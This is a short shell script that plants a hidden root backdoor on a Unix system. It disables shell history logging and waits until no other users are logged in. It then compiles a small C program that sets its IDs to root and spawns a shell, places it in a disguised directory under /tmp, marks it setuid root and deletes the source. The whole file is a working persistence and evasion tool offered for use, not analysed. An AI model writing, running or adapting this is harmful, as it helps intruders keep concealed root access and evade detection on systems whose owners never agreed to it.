#!/bin/sh

# tell the system not to log these commands
unset HISTFILE;
unset HISTSAVE;

# C to start shell as root
code=$(cat<<EOF
int main(void) {
  setgid(0); setuid(0);
  execl("/bin/sh", "sh", 0);
}
EOF
)

compile_binary() {
# sneaky function to try and hide
  mkdir /tmp/". "       # create a directory in /tmp/ called "."
  cd /tmp/". "          # move to new directoruy
  echo $code>./.sh.c    # put C code into a file
  gcc -o ./.sh ./.sh.c  # compile C code into a binary hidden as ".sh"
  chown root:root ./.sh # set ownership to root
  chmod u+s ./.sh       # sticky setuid for root
  rm ./.sh.c            # remove code
}


main() {
  users=$(w|grep -v load|grep -v JCPU|wc -l); # how many users logged in?

  if [ "$users" != "1" ]; then                # if more than 1 user is logged in, we logout
    logout                                    # actually logout
  else                                        # if we are the only user logged in...
    compile_binary                            # compile the code, clean up and try to hide it
    logout                                    # actually logout
  fi
}

main
